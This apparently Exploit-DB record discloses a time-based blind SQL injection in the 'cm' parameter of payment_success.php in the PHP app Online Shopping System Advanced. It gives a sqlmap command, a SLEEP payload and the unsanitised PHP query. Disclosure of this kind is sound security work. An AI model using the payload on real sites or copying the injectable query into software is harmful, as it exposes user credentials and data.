{"source": "https://www.exploit-db.com/exploits/51811", "vulnName": "Online Shopping System Advanced - Sql Injection", "vulnEDBID": "51811", "vulnCVE": "N/A", "author": "FURKAN GEDIK", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-26", "vulnContent": "# Exploit Title: Online Shopping System Advanced\n\n# Date: 07.12.2023\n\n# Exploit Author: Furkan Gedik\n\n# Vendor Homepage: https://github.com/PuneethReddyHC/online-shopping-system-advanced\n\n# Software Link: https://github.com/PuneethReddyHC/online-shopping-system-advanced\n\n# Version: 1.0\n\n# Tested on: [Kali Linux 2020.3]\n\n \n\n \n\n \n\n# Description\n\nUnauthorized access to a database by injecting malicious SQL statements. The SQL injection vulnerability occurs due to the inclusion of the user-provided \"cm\" parameter in the SQL query without proper filtering or sanitization. An attacker can exploit the vulnerability by injecting malicious SQL code in the \"cm\" parameter. Successful exploitation of the vulnerability results in the disclosure of sensitive information from the database, such as user credentials, which can be used to gain unauthorized access to the database.\n\n \n\n# PoC\n\n \n\n[+] sqlmap output \n\nsqlmap.py -u \"http://localhost/online-shopping-system-advanced/payment_success.php?st=Completed&cm=1\" -p cm --dbms=mysql -technique=T --proxy=http://127.0.0.1:8080\n\n \n\nParameter: cm (GET)\n\n    Type: time-based blind\n\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n\n    Payload: st=Completed&cm=1' AND (SELECT 1415 FROM (SELECT(SLEEP(5)))NRHH) AND 'jLpV'='jLpV\n\n \n\n# Vulnerability\n\nhttps://github.com/PuneethReddyHC/online-shopping-system-advanced/blob/master/payment_success.php#L12-L22\n\n[+] payment_success.php \n\nif (isset($_GET[\"st\"])) {\n \n\n # code...\n\n $trx_id = $_GET[\"tx\"];\n\n  $p_st = $_GET[\"st\"];\n\n  $amt = $_GET[\"amt\"];\n\n  $cc = $_GET[\"cc\"];\n\n  $cm_user_id = $_GET[\"cm\"];\n\n  $c_amt = $_COOKIE[\"ta\"];\n\n if ($p_st == \"Completed\") {\n \n\n  include_once(\"db.php\");\n\n  $sql = \"SELECT p_id,qty FROM cart WHERE user_id = '$cm_user_id'\";\n            "}